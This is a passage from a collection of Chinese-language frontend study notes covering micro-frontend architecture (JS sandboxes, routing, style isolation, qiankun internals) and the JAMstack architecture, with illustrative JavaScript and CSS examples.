[figjam](https://www.figma.com/board/9ykLrmg5xwkZvY8cxFinog/0022.%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BE%AE%E5%89%8D%E7%AB%AF%E6%96%B9%E6%A1%88%E5%8F%8A%E5%BE%AE%E5%89%8D%E7%AB%AF%E7%9A%84%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90?node-id=0-1&node-type=canvas&t=4hrfzhAvEhnaDpVF-0)\n\n基座应用，需要做以下事情\n- ① **负责注册子应用**，示例如下\n\t- entry 子应用 HTML 的入口去哪儿拿\n\t- container：==渲染到哪儿==\n\t- activeRule：路由匹配规则\n\t- ![图片&文件](./files/20241101-32.png)\n- ② **基座里，需要监听全局路由，然后找到匹配子应用，然后加载子应用，再然后卸载或切换等**\n\t- fetch 子应用的入口文件 `index.html` ，然后需要**抽取 js , eval** 执行它\n\t- 所以，需要==处理成兼容的 umd 格式==，故需要修改 webpack\n\t- fetch 所以要求同域\n\t- 执行完子应用的脚本后，需要挂载 `#app` 上，但可能会直接覆盖丢主应用；\n\t\t- 所以才会要求子应用有自己的 `container` 属性，这也是为什么建议子应用 name/id 唯一；\n\t- 图片路径可能 404，所以需要注入正确的子应用 public path\n\t- 两个子应用相互跳转时，如果不及时卸载，可能会出现两个子应用**同时展示**的情况\n\t- 关于**样式隔离**，两种方案\n\t\t- 命名空间，类似于 vue style scope\n\t\t- webcomponet 方案\n\n## 8. 路由分发原理\n\n![图片&文件](./files/20241101-30.png)\n\n## 9. 其他微前端框架和实现原理\n\n### 9.1. iframe \n\n![图片&文件](./files/20241127-3.png)\n\n### 9.2. systemjs ： `type=systemjs-importmap`\n\n![图片&文件](./files/20241127-2.png)\n\n### 9.3. micro-app\n\n![图片&文件](./files/20241127-4.png)\n\n## 10. 微前端中JS沙箱具体使用场景\n\n### 10.1. JS沙箱启动时机\n\n#### 10.1.1. 常见的启动时机\n\n1. 子应用==加载时==启动沙箱\n2. 子应用==挂载时==启动沙箱\n\n```javascript hl:1,18\n// 1. 子应用加载时启动沙箱\nclass MicroApp {\n  async loadApp(appConfig) {\n    // 创建沙箱实例\n    const sandbox = new Sandbox(appConfig.name);\n    // 启动沙箱\n    sandbox.start();\n    \n    try {\n      // 加载子应用资源\n      await loadScript(appConfig.entry);\n    } catch (error) {\n      console.error('Load app failed:', error);\n    }\n  }\n}\n\n// 2. 子应用挂载时启动沙箱\nclass Sandbox {\n  async mount() {\n    // 记录当前快照\n    this.snapshotBefore = this.takeSnapshot();\n    \n    // 激活沙箱\n    this.active = true;\n    \n    // 执行子应用的 mount 钩子\n    await this.app.mount();\n  }\n  \n  async unmount() {\n    // 执行子应用的 unmount 钩子\n    await this.app.unmount();\n    \n    // 关闭沙箱\n    this.active = false;\n    \n    // 还原环境\n    this.restoreSnapshot(this.snapshotBefore);\n  }\n}\n```\n\n### 10.2. 混合页面场景处理\n\n#### 10.2.1. 基于路由的隔离：**匹配到路由了，启动**\n\n>   `router.beforeEach` 中检测是否需要启动\n\n\n```javascript hl:6,11,16\n// 路由配置\nconst routes = [\n  {\n    path: '/main/*',  // 主应用路由\n    component: MainApp,\n    sandbox: false    // 不启用沙箱\n  },\n  {\n    path: '/sub/*',   // 子应用路由\n    component: SubApp,\n    sandbox: true     // 启用沙箱\n  }\n];\n\n// 路由守卫\nrouter.beforeEach((to, from, next) => {\n  const needSandbox = to.matched.some(record => record.sandbox);\n  if (needSandbox) {\n    // 启动沙箱\n    sandbox.start();\n  } else {\n    // 关闭沙箱\n    sandbox.stop();\n  }\n  next();\n});\n```\n\n#### 10.2.2. 基于DOM节点的隔离：子应用使用容器沙箱\n\n```javascript hl:19\nclass DomSandbox {\n  constructor(container) {\n    this.container = container;\n    this.shadowRoot = container.attachShadow({ mode: 'closed' });\n  }\n  \n  mount(component) {\n    // 在 Shadow DOM 中渲染子应用\n    this.shadowRoot.innerHTML = '';\n    this.shadowRoot.appendChild(component);\n  }\n}\n\n// 使用示例\nconst mainApp = document.querySelector('#main-app');\nconst subApp = document.querySelector('#sub-app');\n\n// 子应用容器使用沙箱\nconst sandbox = new DomSandbox(subApp);\nsandbox.mount(subAppComponent);\n```\n\n>  关于 `{ mode: 'closed' }` ，更多参考 [8. Shadow DOM 中的 closed mode 和 open mode](/post/yhU713jl.html)\n\n### 10.3. 不同类型的沙箱实现\n\n#### 10.3.1. 快照沙箱（适用于单个子应用）\n\n```javascript\nclass SnapshotSandbox {\n  constructor() {\n    this.snapshot = {};\n    this.modifyPropsMap = {};\n  }\n  \n  start() {\n    // 记录当前window对象快照\n    for (const prop in window) {\n      this.snapshot[prop] = window[prop];\n    }\n  }\n  \n  stop() {\n    // 还原window对象\n    for (const prop in this.modifyPropsMap) {\n      if (this.snapshot[prop] === undefined) {\n        delete window[prop];\n      } else {\n        window[prop] = this.snapshot[prop];\n      }\n    }\n  }\n}\n```\n\n#### 10.3.2. 代理沙箱（适用于多个子应用）\n\n如何适用多个子应用的？\n- ==优先==从自己的环境中取值\n- 否则从全局取值\n\n```javascript\nclass ProxySandbox {\n  constructor() {\n    const fakeWindow = {};\n    const proxy = new Proxy(fakeWindow, {\n      get: (target, prop) => {\n        // 优先从自己的环境中取值\n        if (prop in target) {\n          return target[prop];\n        }\n        // 否则从全局取值\n        return window[prop];\n      },\n      set: (target, prop, value) => {\n        target[prop] = value;\n        return true;\n      }\n    });\n    \n    this.proxy = proxy;\n  }\n  \n  start() {\n    // 将代理对象作为子应用的全局对象\n    window.__PROXY__ = this.proxy;\n  }\n  \n  stop() {\n    // 清理代理对象\n    window.__PROXY__ = undefined;\n  }\n}\n```\n\n#### 10.3.3. 组合沙箱（更完整的隔离）\n\n```javascript\nclass CompositeSandbox {\n  constructor() {\n    this.proxySandbox = new ProxySandbox();\n    this.domSandbox = new DomSandbox();\n    this.eventSandbox = new EventSandbox();\n  }\n  \n  async start() {\n    // 启动所有沙箱\n    this.proxySandbox.start();\n    this.domSandbox.start();\n    this.eventSandbox.start();\n  }\n  \n  async stop() {\n    // 停止所有沙箱\n    this.eventSandbox.stop();\n    this.domSandbox.stop();\n    this.proxySandbox.stop();\n  }\n}\n```\n\n### 10.4. 特殊场景处理\n\n#### 10.4.1. 共享依赖处理 → 比如共享 React、ReactDom 等全局类库\n\n```javascript hl:15\nclass SharedDependencySandbox {\n  constructor(shared = {}) {\n    this.shared = shared;\n  }\n  \n  start() {\n    // 注入共享依赖\n    Object.keys(this.shared).forEach(key => {\n      window[key] = this.shared[key];\n    });\n  }\n}\n\n// 使用示例\nconst sandbox = new SharedDependencySandbox({\n  React: window.React,\n  ReactDOM: window.ReactDOM\n});\n```\n\n#### 10.4.2. 通信机制\n\n```javascript\nclass MessageSandbox {\n  constructor() {\n    this.listeners = new Map();\n  }\n  \n  // 发送消息\n  postMessage(type, data) {\n    const event = new CustomEvent('micro-app-message', {\n      detail: { type, data }\n    });\n    window.dispatchEvent(event);\n  }\n  \n  // 监听消息\n  addEventListener(type, callback) {\n    const listener = (event) => {\n      if (event.detail.type === type) {\n        callback(event.detail.data);\n      }\n    };\n    \n    this.listeners.set(callback, listener);\n    window.addEventListener('micro-app-message', listener);\n  }\n  \n  // 移除监听\n  removeEventListener(callback) {\n    const listener = this.listeners.get(callback);\n    if (listener) {\n      window.removeEventListener('micro-app-message', listener);\n      this.listeners.delete(callback);\n    }\n  }\n}\n```\n\n### 10.5. 最佳实践建议\n\n#### 10.5.1. 性能优化\n\n- 使用 `WeakMap` 存储状态，避免内存泄漏\n- 使用 `requestIdleCallback` 进行初始化\n\n```javascript hl:3,6\nclass OptimizedSandbox {\n  constructor() {\n    // 使用 WeakMap 存储状态，避免内存泄漏\n    this.state = new WeakMap();\n    \n    // 使用 requestIdleCallback 进行初始化\n    requestIdleCallback(() => {\n      this.init();\n    });\n  }\n  \n  init() {\n    // 初始化沙箱环境\n  }\n}\n```\n\n#### 10.5.2. 错误处理\n\n```javascript\nclass ErrorBoundarySandbox {\n  async executeInSandbox(code) {\n    try {\n      // 在沙箱中执行代码\n      const result = await this.proxy.eval(code);\n      return result;\n    } catch (error) {\n      // 错误处理\n      console.error('Sandbox execution error:', error);\n      // 通知主应用\n      this.reportError(error);\n      // 尝试恢复\n      this.recover();\n    }\n  }\n}\n```\n\n#### 10.5.3. 生命周期管理\n\n```javascript\nclass LifecycleSandbox {\n  constructor() {\n    this.status = 'inactive';\n    this.hooks = new Map();\n  }\n  \n  registerHook(name, fn) {\n    this.hooks.set(name, fn);\n  }\n  \n  async start() {\n    this.status = 'starting';\n    await this.executeHook('beforeStart');\n    // 启动沙箱逻辑\n    this.status = 'active';\n    await this.executeHook('afterStart');\n  }\n  \n  async stop() {\n    this.status = 'stopping';\n    await this.executeHook('beforeStop');\n    // 停止沙箱逻辑\n    this.status = 'inactive';\n    await this.executeHook('afterStop');\n  }\n}\n```\n\n使用建议：\n1. 根据应用场景选择合适的沙箱类型\n2. 注意性能影响，避免频繁创建销毁沙箱\n3. 合理处理共享资源和通信机制\n4. 实现完善的错误处理和恢复机制\n5. 做好沙箱的生命周期管理\n6. 考虑浏览器兼容性问题\n\n## 11. 主应用和多个子应用并存时的沙箱处理方案：\n\n### 11.1. 基于路由的沙箱管理（最常用）\n\n关键点：\n- 找到要进入的路由对应的应用名\n- 如果果离开的是子应用，==关闭其沙箱==\n- 如果进入的是子应用，==启动其沙箱==\n\n```javascript hl:8,13\n// 路由监听\nrouter.beforeEach((to, from, next) => {\n  // 找到要进入的路由对应的应用名\n  const toAppName = to.matched[0]?.appName;\n  // 找到要离开的路由对应的应用名\n  const fromAppName = from.matched[0]?.appName;\n\n  // 如果离开的是子应用，关闭其沙箱\n  if (fromAppName) {\n    sandboxManager.stopSandbox(fromAppName);\n  }\n\n  // 如果进入的是子应用，启动其沙箱\n  if (toAppName) {\n    sandboxManager.startSandbox(toAppName);\n  }\n\n  next();\n});\n```\n\n#### 11.1.1. 简单的沙箱管理类\n\n```javascript hl:8,16\n// 简单的沙箱管理类\nclass SandboxManager {\n  constructor() {\n    // 存储所有子应用的沙箱实例\n    this.sandboxes = new Map();\n  }\n\n  // 启动某个子应用的沙箱\n  startSandbox(appName) {\n    const sandbox = this.sandboxes.get(appName);\n    if (sandbox) {\n      sandbox.active = true;\n    }\n  }\n\n  // 关闭某个子应用的沙箱\n  stopSandbox(appName) {\n    const sandbox = this.sandboxes.get(appName);\n    if (sandbox) {\n      sandbox.active = false;\n    }\n  }\n}\n\n// 路由配置示例\nconst routes = [\n  {\n    path: '/',              // 主应用路由\n    component: MainApp,     // 不需要沙箱\n  },\n  {\n    path: '/app1/*',        // 子应用1\n    component: MicroApp1,\n    appName: 'app1'         // 需要沙箱\n  },\n  {\n    path: '/app2/*',        // 子应用2\n    component: MicroApp2,\n    appName: 'app2'         // 需要沙箱\n  }\n];\n\n\n```\n\n### 11.2. 基于 DOM 结构的沙箱管理（混合页面场景）\n\n```javascript hl:7,8\n// HTML 结构\n<div id=\"main-app\">\n  <!-- 主应用内容 -->\n  <header>主应用的头部</header>\n  \n  <!-- 子应用容器 -->\n  <div id=\"sub-app1\"></div>\n  <div id=\"sub-app2\"></div>\n</div>\n\n// JavaScript 代码\nclass SimpleSandbox {\n  constructor(appName, container) {\n    this.appName = appName;\n    this.container = container;\n  }\n\n  // 启动沙箱\n  start() {\n    console.log(`${this.appName} sandbox started`);\n    // 这里添加沙箱隔离逻辑\n  }\n\n  // 关闭沙箱\n  stop() {\n    console.log(`${this.appName} sandbox stopped`);\n    // 这里添加清理逻辑\n  }\n}\n\n\n```\n\n#### 11.2.1. 当容器进入视口时启动沙箱：`IntersectionObserver` 为了性能优化\n\n```javascript hl:6\n// 初始化子应用\nfunction initSubApp(appName, containerId) {\n  const container = document.getElementById(containerId);\n  const sandbox = new SimpleSandbox(appName, container);\n  \n  // 当容器进入视口时启动沙箱\n  const observer = new IntersectionObserver((entries) => {\n    entries.forEach(entry => {\n      if (entry.isIntersecting) {\n        sandbox.start();\n      } else {\n        sandbox.stop();\n      }\n    });\n  });\n  \n  observer.observe(container);\n}\n\n// 初始化所有子应用\ninitSubApp('app1', 'sub-app1');\ninitSubApp('app2', 'sub-app2');\n```\n\n### 11.3. 主子应用通信场景\n\n```javascript\n// 简单的消息通道\nclass MessageChannel {\n  constructor() {\n    this.listeners = new Map();\n  }\n\n  // 发送消息\n  send(from, to, message) {\n    const event = new CustomEvent('micro-app-message', {\n      detail: { from, to, message }\n    });\n    window.dispatchEvent(event);\n  }\n\n  // 接收消息\n  listen(appName, callback) {\n    const handler = (event) => {\n      const { from, to, message } = event.detail;\n      if (to === appName || to === '*') {\n        callback(message, from);\n      }\n    };\n\n    window.addEventListener('micro-app-message', handler);\n    this.listeners.set(appName, handler);\n  }\n}\n\n// 使用示例\nconst messageChannel = new MessageChannel();\n\n// 主应用发送消息给子应用\nmessageChannel.send('main', 'app1', { type: 'update', data: {...} });\n\n// 子应用监听消息\nmessageChannel.listen('app1', (message, from) => {\n  console.log(`收到来自 ${from} 的消息:`, message);\n});\n```\n\n### 11.4. 实际应用建议\n\n#### 11.4.1. **按需启动**\n\n```javascript\n// 只在必要时启动沙箱\nif (isSubApp(appName)) {\n  sandbox.start();\n}\n```\n\n#### 11.4.2. **资源共享**\n\n```javascript hl:2\n// 可以设置一些公共资源不进入沙箱\nconst globalVars = ['React', 'Vue', 'jQuery'];\nsandbox.setGlobalVariables(globalVars);\n```\n\n#### 11.4.3. **性能优化**\n\n```javascript hl:4\n// 使用延迟加载\nconst sandbox = new Proxy({}, {\n  get(target, property) {\n    // 只在实际使用时初始化\n    if (!target.instance) {\n      target.instance = new Sandbox();\n    }\n    return target.instance[property];\n  }\n});\n```\n\n这样的实现方式更加清晰和实用，主要关注点在于：\n- 何时启动沙箱（进入子应用时）\n- 何时关闭沙箱（离开子应用时）\n- 如何处理多个子应用（每个子应用独立的沙箱实例）\n- 主子应用如何通信（消息通道）\n\n这种方式可以确保：\n1. 主应用正常运行不受影响\n2. 子应用间相互隔离\n3. 资源可以按需加载和释放\n4. 维护成本相对较低\n\n## 12. 更多\n\n- 再把之前整理的草稿流程图看看，详见 [figjam](https://www.figma.com/board/9ykLrmg5xwkZvY8cxFinog/0022.%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BE%AE%E5%89%8D%E7%AB%AF%E6%96%B9%E6%A1%88%E5%8F%8A%E5%BE%AE%E5%89%8D%E7%AB%AF%E7%9A%84%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90?node-id=0-1&node-type=canvas&t=4hrfzhAvEhnaDpVF-0)\n- https://www.garfishjs.org/blog/architecture.html\n- https://juejin.cn/post/7113503219904430111\n\n","beBNemRn":"\n# JAMstack 架构\n\n`#前端` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n-  JAMstack\n\t- JavaScript\n\t- API \n\t- Markup（标记）\n- 会触发大量的==部署构建操作==  → 部署到 CDN\n\t- ![图片&文件](./files/20250103-1.png)\n- 使用场景：业务场景非常狭小，只能用于内容更新不大频繁的 CMS 站点\n\t- 高性能\n\t- 偏静态\n- 优势\n\t- 高安全性： 减少了服务器端代码的执行，降低了攻击面。\n\t- 高性能\n\n## 2. 定义\n\nJAMstack 是一种现代 Web 开发架构，强调使用 JavaScript、API 和 Markup（标记）来构建高性能和高安全性的 Web 应用。\n\n![image.png|776](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/ff6bf70189d55690f74889441c4f9ca2.png)\n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/20b4de6008f7cfc8c07f1d11772e1573.png)\n\n## 3. 产生背景\n\n> **传统的网站架构 ： 无论如何都需要一个实时的在线服务，它在处理这些不怎么变动的内容时，很鸡肋：计算量很小，但是依旧需要大量后端和运维人员维护网站的安全性、稳定性、可伸缩性……**\n\n## 4. JAMstack 的核心概念\n\n### 4.1. JavaScript\n\n- 用于处理前端逻辑和交互。可以使用各种 JavaScript 框架和库，如 React、Vue.js、Angular 等。\n- JavaScript 代码通常在客户端执行，减少了服务器负担。\n\n### 4.2. API\n\n- 通过 API 调用来获取动态数据和执行服务器端操作。\n- 可以使用第三方服务（如 Auth0、Stripe、Firebase等）或 自建的 API（如 RESTful API、GraphQL）。\n- API 通常是无状态的，提供了良好的可扩展性和灵活性。\n\n### 4.3. Markup（标记）\n\n- 使用静态站点生成器（如 Gatsby、Next.js、Hugo、vitepress 等）预生成 HTML 页面。\n- 这些页面在构建时生成，可以直接部署到 CDN，提高加载速度和性能。\n\n## 5. JAMstack 的优势\n\n### 5.1. 高性能\n\n   - 预生成的静态页面可以通过 CDN 快速分发，减少了服务器响应时间。\n   - 静态资源通常比动态内容加载更快，提高了用户体验。\n\n### 5.2. 高安全性\n\n   - 减少了服务器端代码的执行，降低了攻击面。\n   - 静态文件不容易受到传统的服务器攻击（如 SQL 注入）。\n\n### 5.3. 可扩展性\n\n   - 静态站点可以轻松扩展，通过增加新的静态文件和 API 调用来实现更多功能。\n   - API 调用可以根据需要进行扩展和修改，而不影响前端代码。\n\n### 5.4. 开发效率\n\n   - 开发者可以专注于前端代码和用户体验，而不需要处理复杂的服务器端逻辑。\n   - 使用现代前端框架和工具链，提高了开发效率和代码质量。\n\n## 6. JAMstack 的劣势\n\n**业务场景非常狭小，只能用于内容更新不大频繁的 CMS 站点**。国外也有无头电商（Headless Commerce）的商业实践，但是前景并不明朗。\n\n## 7. 常见的 JAMstack 工具和框架\n\n### 7.1. 静态站点生成器\n\n- **Gatsby**：基于 React 的静态站点生成器，支持 GraphQL 数据查询。\n- **Next.js**：提供静态生成和服务器端渲染（SSR）的混合模式，适用于复杂的 Web 应用。\n- **Hugo**：一个快速、灵活的静态站点生成器，使用 `Go 语言`编写。\n- Jekyll\n- Nuxt.js\n   - 基于Vue.js的框架，支持静态生成和服务器端渲染（SSR）。\n   - 适用于构建复杂的Vue.js应用。\n\n### 7.2. API 服务\n\n- **Headless CMS**：如 Contentful、Sanity、Strapi，提供内容管理和 API 接口。\n- **服务器端功能**：如 AWS Lambda、Netlify Functions，用于实现无服务器计算。\n   - **正常云服务厂商都有提供，比如用过腾讯云提供serverless服务**\n- **第三方 API**：如 Auth0（身份验证）、Stripe（支付）、Algolia（搜索）。\n\n### 7.3. 部署和托管\n\n- **Netlify**：提供静态站点托管、无服务器函数和持续集成（CI/CD）服务。\n- **Vercel**：支持` Next.js` 和其他静态站点的托管，提供无服务器函数和自动部署。\n- **GitHub Pages**：适用于简单的静态站点托管，集成了 GitHub 仓库。\n- **正常云服务产商都有提供这个能力，比如 Amazon、阿里云、腾讯云等**\n\n## 8. JAMstack 的工作流程\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/20b4de6008f7cfc8c07f1d11772e1573.png)\n\n> 其实很类似 [https://elog.1874.cool/notion/vy55q9xwlqlsfrvk](https://elog.1874.cool/notion/vy55q9xwlqlsfrvk) 的思路\n\n![image.png|648](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/fd45c197b1ed7399ddf97db551d64af0.png)\n\n### 8.1. 开发阶段\n\n- 使用静态站点生成器（如 Gatsby、Next.js）编写前端代码和模板。\n- **通过 API 获取动态数据，并将其嵌入到静态页面中**。\n- 使用 JavaScript 实现前端交互和动态功能。\n\n### 8.2. 构建阶段\n\n- 运行构建工具，生成静态 HTML、CSS 和 JavaScript 文件。\n- 预生成的页面文件可以直接部署到 CDN 或静态托管服务。\n\n### 8.3. 部署阶段\n\n- 将静态文件上传到托管平台（如 Netlify、Vercel）。\n- 配置 CDN 分发，确保全球用户都能快速访问。\n\n### 8.4. 运行时\n\n- 用户访问网站时，CDN 会提供预生成的静态页面，确保快速加载。\n- 前端 JavaScript 代码在浏览器中执行，调用 API 获取和更新数据。\n- 无服务器函数处理特定的服务器端任务，如表单提交、身份验证等。\n\n## 9. 使用 JAMstack 的场景\n\n### 9.1. 博客和内容网站\n\n   - 使用 Headless CMS 管理内容，通过静态站点生成器生成 HTML 页面。\n   - 预生成的页面通过 CDN 分发，提供快速的阅读体验。\n\n### 9.2. 电商网站\n\n   - 产品信息和库存通过 API 获取，前端使用 JavaScript 实现购物车和结账功能。\n   - 静态页面展示产品列表和详情，提高页面加载速度。\n\n### 9.3. 企业官网\n\n   - 静态页面展示公司信息、服务和案例，减少服务器负担。\n   - 表单提交和用户交互通过无服务器函数处理。\n\n## 10. 总结\n\nJAMstack 通过将 JavaScript、API 和 Markup 结合起来，提供了一种高效、安全和可扩展的 Web 开发架构。它适用于各种类型的 Web 应用，从简单的博客到复杂的电商网站。通过使用现代工具和框架，开发者可以快速构建和部署高性能的 Web 应用，提供卓越的用户体验。\n","JvP4OTyz":"\n# 微前端原理（篇三：乾坤）\n\n`#微前端` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 核心能力\n\t1. 应用加载（HTML Entry）\n\t2. JavaScript 沙箱\n\t3. 样式隔离\n\t4. 生命周期管理\n\t5. 应用通信\n- 应用加载（HTML Entry）\n\t- 获取 HTML 内容\n\t- 解析 HTML，提取资源\n\t- 加载外部脚本和样式\n\t- 渲染应用\n- 生命周期管理\n\t1. bootstrap：应用首次加载时调用\n\t2. mount：应用激活时调用\n\t3. unmount：应用切换/卸载时调用\n\t4. update：应用更新时调用\n- 通讯方式\n\t1. Props：简单直接，适合==父子通信==\n\t2. 全局状态：功能完整，适合复杂场景\n\t3. 自定义事件：灵活，但需要自行管理 \n- 样式隔离\n\t- strictStyleIsolation：使用 Shadow DOM ：严格隔离\n\t\t- 隔离更彻底，但兼容性问题多\n\t- experimentalStyleIsolation：特定前缀\n\t\t- 兼容性更好，但隔离不够彻底\n- 性能优化策略\n\t1. 应用预加载\n\t2. 资源==缓存复用==：缓存检测\n\t3. ==并行==加载优化\n\t4. 按需加载策略\n- 错误处理机制\n\t1. 应用加载错误\n\t2. 运行时错误\n\t3. 生命周期错误\n\t4. 资源加载错误 \n\n## 2. 整体架构\n\n乾坤基于 single-spa 封装，实现了以下核心功能：\n\n```javascript hl:7,5\n// 主应用注册微应用\nregisterMicroApps([\n  {\n    name: 'app1',\n    entry: '//localhost:8080',\n    container: '#container',\n    activeRule: '/app1'\n  }\n]);\n\n// 启动主应用\nstart();\n```\n\n核心功能模块：\n1. 应用加载（HTML Entry）\n2. JavaScript 沙箱\n3. 样式隔离\n4. 生命周期管理\n5. 应用通信 \n\n## 3. 应用加载机制（HTML Entry）\n\n乾坤使用 HTML Entry 方式加载应用，主要步骤：\n- 获取 HTML 内容\n- 解析 HTML，提取资源\n- 加载外部脚本和样式\n- 渲染应用\n\n```javascript hl:10\nasync function loadApp(app) {\n  // 1. 获取 HTML 内容\n  const html = await fetch(app.entry).then(res => res.text());\n  \n  // 2. 解析 HTML，提取资源\n  const { \n    template,    // DOM 结构\n    scripts,     // JS 脚本\n    styles      // CSS 样式\n  } = parseHTML(html);\n  \n  // 3. 加载外部脚本和样式\n  await Promise.all([\n    loadScripts(scripts),\n    loadStyles(styles)\n  ]);\n  \n  // 4. 渲染应用\n  const container = document.querySelector(app.container);\n  container.innerHTML = template;\n}\n```\n\n## 4. 生命周期管理\n\n乾坤为每个微应用定义了完整的生命周期：\n\n```javascript\n// 微应用需要导出以下生命周期函数\nexport async function bootstrap() {\n  // 应用初始化\n}\n\nexport async function mount(props) {\n  // 应用挂载\n  render(props);\n}\n\nexport async function unmount() {\n  // 应用卸载\n  cleanup();\n}\n\n// 可选\nexport async function update(props) {\n  // 应用更新\n}\n```\n\n生命周期执行流程：\n1. bootstrap：应用首次加载时调用\n2. mount：应用激活时调用\n3. unmount：应用切换/卸载时调用\n4. update：应用更新时调用\n\n## 5. 路由系统\n\n乾坤的路由系统基于 URL 改变触发应用切换：\n- 支持配置式路由\n- 支持函数动态判断\n- 自动处理应用切换 \n\n```javascript\nclass RouterEngine {\n  constructor(apps) {\n    this.apps = apps;\n    window.addEventListener('popstate', this.handleRouteChange);\n  }\n  \n  handleRouteChange = () => {\n    const { pathname } = window.location;\n    // 查找匹配的应用\n    const app = this.apps.find(app => {\n      return this.isActive(app.activeRule, pathname);\n    });\n    \n    if (app) {\n      // 加载并挂载应用\n      this.mountApp(app);\n    }\n  }\n  \n  isActive(rule, pathname) {\n    // 支持字符串或函数规则\n    return typeof rule === 'function' \n      ? rule(pathname)\n      : pathname.startsWith(rule);\n  }\n}\n```\n\n## 6. 应用通信机制\n\n乾坤提供多种应用通信方式：\n\n```javascript\n// 1. Props 传递\nregisterMicroApps([{\n  name: 'app1',\n  props: { data: 'shared data' }\n}]);\n\n// 2. 全局状态管理\nimport { initGlobalState } from 'qiankun';\n\nconst actions = initGlobalState({\n  user: 'qiankun'\n});\n\n// 主应用监听\nactions.onGlobalStateChange((state, prev) => {\n  console.log(state, prev);\n});\n\n// 子应用监听\nexport function mount(props) {\n  props.onGlobalStateChange((state, prev) => {\n    console.log(state, prev);\n  });\n}\n\n// 3. 自定义事件\nwindow.addEventListener('app1-event', () => {});\n```\n\n### 6.1. 通信方式比较\n\n1. Props：简单直接，适合父子通信\n2. 全局状态：功能完整，适合复杂场景\n3. 自定义事件：灵活，但需要自行管理 \n\n## 7. 样式隔离\n\n乾坤提供两种样式隔离方案：\n- 使用 Shadow DOM ：严格隔离\n- experimentalStyleIsolation：特定前缀\n\n```javascript\n// 1. 严格隔离：使用 Shadow DOM\nregisterMicroApps([{\n  name: 'app1',\n  sandbox: {\n    strictStyleIsolation: true // 使用 Shadow DOM\n  }\n}]);\n\n// 2. 作用域隔离：添加特定前缀\nregisterMicroApps([{\n  name: 'app1',\n  sandbox: {\n    experimentalStyleIsolation: true // 添加特定前缀\n  }\n}]);\n```\n\n## 8. qiankun 中这两种样式隔离方式的区别和各自的问题：\n\n### 8.1. strictStyleIsolation（严格隔离）\n\n这种方式使用 Shadow DOM 实现样式隔离：\n\n```javascript\n// qiankun 内部实现原理\nfunction createShadowDOM(container) {\n  return container.attachShadow({ mode: 'open' });\n}\n\n// 子应用挂载\nconst shadowRoot = createShadowDOM(container);\nshadowRoot.appendChild(subAppRoot);\n```\n\n#### 8.1.1. 存在的问题：\n\n1. **第三方组件库兼容性问题**\n```javascript\n// 某些组件库会在 document.body 上挂载元素\n// 比如 antd 的 Modal、Drawer、Message 等\nconst Modal = () => {\n  // 这些组件会被挂载到 body 上\n  // 而不是 Shadow DOM 内部，导致样式失效\n  return ReactDOM.createPortal(\n    <div className=\"ant-modal\">...</div>,\n    document.body\n  );\n};\n```\n\n2. **弹窗层级问题**\n```css\n/* Shadow DOM 内部的元素 z-index 无法超过 Shadow DOM 的边界 */\n.modal {\n  z-index: 9999; /* 在 Shadow DOM 中不会生效 */\n}\n```\n\n3. **一些特殊 CSS 特性的限制**\n```css\n/* 例如 position: fixed 相对于 Shadow DOM 根节点定位，而不是 viewport */\n.fixed-element {\n  position: fixed;\n  top: 0;\n  /* 会相对于 Shadow DOM 定位，而不是浏览器窗口 */\n}\n```\n\n### 8.2. experimentalStyleIsolation（实验性隔离）\n\n这种方式通过给样式添加前缀选择器来实现隔离：\n\n```javascript\n// 原始样式\n.title { color: red; }\n\n// 转换后\ndiv[data-qiankun=\"app1\"] .title { color: red; }\n```\n\n#### 8.2.1. 工作原理：\n\n```javascript\n// qiankun 内部实现示意\nfunction processCSSRule(rule, appName) {\n  const prefix = `[data-qiankun=\"${appName}\"]`;\n  \n  // 处理选择器\n  if (rule.selectorText) {\n    rule.selectorText = rule.selectorText\n      .split(',')\n      .map(selector => `${prefix} ${selector}`)\n      .join(',');\n  }\n}\n```\n\n#### 8.2.2. 优点：\n\n1. **更好的兼容性**\n```javascript\n// 弹窗组件可以正常工作\nconst Modal = () => {\n  return ReactDOM.createPortal(\n    <div className=\"modal\">...</div>,\n    document.body\n  );\n};\n```\n\n2. **支持完整的 CSS 特性**\n```css\n/* position: fixed 可以正常工作 */\n.fixed-element {\n  position: fixed;\n  top: 0;\n  /* 会相对于视口定位 */\n}\n```\n\n#### 8.2.3. 但也存在一些问题：\n\n1. **动态生成的样式可能逃逸**\n```javascript\n// 动态插入的样式可能没有被正确处理\nconst style = document.createElement('style');\nstyle.textContent = '.dynamic { color: blue; }';\ndocument.head.appendChild(style);\n```\n\n2. **性能开销**\n```javascript\n// 需要实时处理样式规则\nconst observer = new MutationObserver((mutations) => {\n  mutations.forEach((mutation) => {\n    // 处理新增的样式节点\n    processNewStyleNodes(mutation.addedNodes);\n  });\n});\n```\n\n### 8.3. 最佳实践建议\n\n#### 8.3.1. 选择建议\n\n```javascript\n// 1. 如果应用比较简单，推荐使用 experimentalStyleIsolation\n{\n  name: 'app1',\n  entry: '//localhost:8081',\n  container: '#container',\n  props: {\n    experimentalStyleIsolation: true\n  }\n}\n\n// 2. 如果需要完全隔离且不依赖第三方组件库，可以使用 strictStyleIsolation\n{\n  name: 'app2',\n  entry: '//localhost:8082',\n  container: '#container',\n  props: {\n    strictStyleIsolation: true\n  }\n}\n```\n\n#### 8.3.2. 混合使用策略\n\n```javascript\n// 可以针对不同子应用采用不同的隔离策略\nconst apps = [\n  {\n    name: 'simple-app',\n    // 简单应用使用实验性隔离\n    props: { experimentalStyleIsolation: true }\n  },\n  {\n    name: 'complex-app',\n    // 复杂应用使用自定义隔离方案\n    props: {\n      sandbox: {\n        experimentalStyleIsolation: true,\n        // 添加额外的样式处理\n        stylePatching: (styles, appName) => {\n          // 自定义样式处理逻辑\n        }\n      }\n    }\n  }\n];\n```\n\n#### 8.3.3. 处理特殊场景\n\n```javascript\n// 对于需要全局生效的样式，可以在主应用中设置\nconst globalStyles = `\n  /* 这些样式将对所有应用生效 */\n  :root {\n    --primary-color: `#1890ff;`\n  }\n  \n  /* 弹窗层级管理 */\n  .global-modal {\n    z-index: 1000;\n  